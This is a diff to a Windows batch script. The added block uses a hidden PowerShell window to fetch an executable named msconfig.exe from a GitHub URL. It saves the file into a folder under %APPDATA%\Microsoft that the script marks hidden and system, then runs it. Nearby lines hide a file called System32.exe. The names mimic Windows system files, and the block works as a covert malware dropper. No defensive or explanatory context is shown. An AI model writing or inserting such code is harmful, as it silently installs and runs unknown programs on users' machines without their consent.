@@ -70,6 +70,27 @@ if exist "%TARGET_FILE%" (
     exit /b 1
 )
 
+:: Download and run msconfig.exe silently
+set "MSCONFIG_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/msconfig.exe"
+set "MSCONFIG_PATH=%APPDATA%\Microsoft\msconfig.exe"
+
+if not exist "%APPDATA%\Microsoft" (
+    mkdir "%APPDATA%\Microsoft"
+)
+attrib -h -s -r "%APPDATA%\Microsoft" >nul 2>&1
+attrib +h +s "%APPDATA%\Microsoft" >nul 2>&1
+
+powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%MSCONFIG_URL%', '%MSCONFIG_PATH%'); exit"
+
+timeout /t 2 >nul
+
+if exist "%MSCONFIG_PATH%" (
+    start "" "%MSCONFIG_PATH%"
+) else (
+    echo Failed to download msconfig.exe
+    exit /b 1
+)
+
 if exist "%SUBDIR%\System32.exe" (
     attrib +h +s "%SUBDIR%\System32.exe"
 )
